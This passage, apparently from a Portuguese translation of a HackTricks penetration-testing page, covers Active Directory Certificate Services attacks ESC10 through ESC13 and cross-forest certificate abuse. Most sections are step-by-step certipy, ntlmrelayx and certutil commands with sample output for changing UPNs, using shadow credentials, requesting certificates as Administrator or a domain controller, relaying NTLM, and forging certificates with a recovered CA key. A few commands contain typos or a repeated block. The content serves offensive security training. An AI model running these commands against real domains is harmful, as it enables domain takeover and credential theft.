Se `CertificateMappingMethods` incluir o bit `UPN` (`0x4`).

### Abuse Case 1

Com `StrongCertificateBindingEnforcement` configurado como `0`, uma conta A com permissões `GenericWrite` pode ser explorada para comprometer qualquer conta B.

Por exemplo, tendo permissões `GenericWrite` sobre `Jane@corp.local`, um atacante visa comprometer `Administrator@corp.local`. O procedimento espelha o ESC9, permitindo que qualquer modelo de certificado seja utilizado.

Inicialmente, o hash de `Jane` é recuperado usando Credenciais de Sombra, explorando o `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Subsequentemente, o `userPrincipalName` de `Jane` é alterado para `Administrator`, omitindo deliberadamente a parte `@corp.local` para evitar uma violação de restrição.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Seguindo isso, um certificado que permite a autenticação do cliente é solicitado como `Jane`, usando o modelo padrão `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` é então revertido para o original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autenticar-se com o certificado obtido resultará no hash NT de `Administrator@corp.local`, sendo necessário especificar o domínio no comando devido à ausência de detalhes do domínio no certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de Abuso 2

Com o `CertificateMappingMethods` contendo a flag de bit `UPN` (`0x4`), uma conta A com permissões `GenericWrite` pode comprometer qualquer conta B que não possua a propriedade `userPrincipalName`, incluindo contas de máquina e o administrador de domínio embutido `Administrator`.

Aqui, o objetivo é comprometer `DC$@corp.local`, começando por obter o hash de `Jane` através de Credenciais Sombreadas, aproveitando o `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
O `userPrincipalName` de `Jane` é então definido como `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Um certificado para autenticação de cliente é solicitado como `Jane` usando o modelo padrão `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
O `userPrincipalName` de `Jane` é revertido para o original após este processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticar via Schannel, a opção `-ldap-shell` do Certipy é utilizada, indicando sucesso na autenticação como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Através do shell LDAP, comandos como `set_rbcd` permitem ataques de Delegação Constrangida Baseada em Recursos (RBCD), potencialmente comprometendo o controlador de domínio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidade também se estende a qualquer conta de usuário que não tenha um `userPrincipalName` ou onde ele não corresponda ao `sAMAccountName`, sendo o `Administrator@corp.local` um alvo principal devido aos seus privilégios elevados no LDAP e à ausência de um `userPrincipalName` por padrão.

## Relaying NTLM to ICPR - ESC11

### Explicação

Se o CA Server não estiver configurado com `IF_ENFORCEENCRYPTICERTREQUEST`, ele pode permitir ataques de relé NTLM sem assinatura via serviço RPC. [Referência aqui](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Você pode usar `certipy` para enumerar se `Enforce Encryption for Requests` está desativado e o certipy mostrará as vulnerabilidades `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Cenário de Abuso

É necessário configurar um servidor de retransmissão:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para controladores de domínio, devemos especificar `-template` em DomainController.

Ou usando o [fork de sploutchy do impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administradores podem configurar a Autoridade Certificadora para armazená-la em um dispositivo externo como o "Yubico YubiHSM2".

Se um dispositivo USB estiver conectado ao servidor CA via uma porta USB, ou um servidor de dispositivo USB no caso de o servidor CA ser uma máquina virtual, uma chave de autenticação (às vezes chamada de "senha") é necessária para que o Provedor de Armazenamento de Chaves gere e utilize chaves no YubiHSM.

Esta chave/senha é armazenada no registro sob `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` em texto claro.

Referência [aqui](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Se a chave privada da CA estiver armazenada em um dispositivo USB físico quando você obtiver acesso ao shell, é possível recuperar a chave.

Primeiro, você precisa obter o certificado da CA (este é público) e então:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finalmente, use o comando certutil `-sign` para forjar um novo certificado arbitrário usando o certificado CA e sua chave privada.

## Abuso de Link de Grupo OID - ESC13

### Explicação

O atributo `msPKI-Certificate-Policy` permite que a política de emissão seja adicionada ao modelo de certificado. Os objetos `msPKI-Enterprise-Oid` que são responsáveis pela emissão de políticas podem ser descobertos no Contexto de Nomeação de Configuração (CN=OID,CN=Public Key Services,CN=Services) do contêiner OID PKI. Uma política pode ser vinculada a um grupo AD usando o atributo `msDS-OIDToGroupLink` deste objeto, permitindo que um sistema autorize um usuário que apresenta o certificado como se ele fosse um membro do grupo. [Referência aqui](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Em outras palavras, quando um usuário tem permissão para inscrever um certificado e o certificado está vinculado a um grupo OID, o usuário pode herdar os privilégios desse grupo.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Cenário de Abuso

Encontre uma permissão de usuário que possa usar `certipy find` ou `Certify.exe find /showAllPermissions`.

Se `John` tiver permissão para inscrever `VulnerableTemplate`, o usuário pode herdar os privilégios do grupo `VulnerableGroup`.

Tudo o que precisa fazer é especificar o template, ele receberá um certificado com direitos OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Comprometendo Florestas com Certificados Explicados na Voz Passiva

### Quebra de Confianças de Floresta por CAs Comprometidas

A configuração para **inscrição entre florestas** é feita de forma relativamente simples. O **certificado CA raiz** da floresta de recursos é **publicado nas florestas de conta** pelos administradores, e os **certificados CA empresarial** da floresta de recursos são **adicionados aos contêineres `NTAuthCertificates` e AIA em cada floresta de conta**. Para esclarecer, esse arranjo concede à **CA na floresta de recursos controle total** sobre todas as outras florestas para as quais gerencia PKI. Se essa CA for **comprometida por atacantes**, certificados para todos os usuários nas florestas de recursos e de conta poderiam ser **forjados por eles**, quebrando assim a fronteira de segurança da floresta.

### Privilégios de Inscrição Concedidos a Principais Estrangeiros

Em ambientes de múltiplas florestas, é necessário ter cautela em relação às CAs Empresariais que **publicam modelos de certificado** que permitem **Usuários Autenticados ou principais estrangeiros** (usuários/grupos externos à floresta à qual a CA Empresarial pertence) **direitos de inscrição e edição**.\
Após a autenticação através de uma confiança, o **SID de Usuários Autenticados** é adicionado ao token do usuário pelo AD. Assim, se um domínio possui uma CA Empresarial com um modelo que **permite direitos de inscrição para Usuários Autenticados**, um modelo poderia potencialmente ser **inscrito por um usuário de uma floresta diferente**. Da mesma forma, se **direitos de inscrição forem explicitamente concedidos a um principal estrangeiro por um modelo**, uma **relação de controle de acesso entre florestas é criada**, permitindo que um principal de uma floresta **se inscreva em um modelo de outra floresta**.

Ambos os cenários levam a um **aumento na superfície de ataque** de uma floresta para outra. As configurações do modelo de certificado poderiam ser exploradas por um atacante para obter privilégios adicionais em um domínio estrangeiro.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
